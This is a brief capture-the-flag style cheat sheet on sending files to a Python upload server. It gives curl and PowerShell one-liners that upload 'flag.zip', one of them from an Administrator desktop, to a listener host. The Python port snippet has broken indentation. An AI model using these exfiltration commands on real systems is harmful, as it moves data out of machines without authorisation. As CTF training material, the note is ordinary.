# Using Curl to POST data to SimpleHTTPServerWithUpload.py


## Caveats
* Insecure communications (HTTP)
    * Choose a server that accepts POST request and makes use of HTTPS
    
## Download
* [SimpleHTTPServerwithUpload_Python3](https://gist.github.com/touilleMan/eb02ea40b93e52604938) from @touilleMan


## Modify listening port
* If you want to change the port that the script is listening to (by default 8000/tcp), use below to replace function "test". (i.e. 1337/tcp)
        
    ```python
    def test(HandlerClass=SimpleHTTPRequestHandler, ServerClass=http.server.HTTPServer):
    server_address = ('', 1337)
    httpd = ServerClass(server_address,HandlerClass)
    httpd.serve_forever()
    ```

## From client-side

Once SimpleHTTPServer is running then: (`#!bash python3 SimpleHTTPServerWithUpload.py`)

* Linux
    ```bash
    curl -F "file=@flag.zip" http://10.1.2.3:8000/
    ```
* Powershell
    ```powershell
    $wc=New-Object System.Net.WebClient;$resp=$wc.UploadFile('http://10.1.2.3:8000',"C:\Users\Administrator\Desktop\flag.zip")
    ```
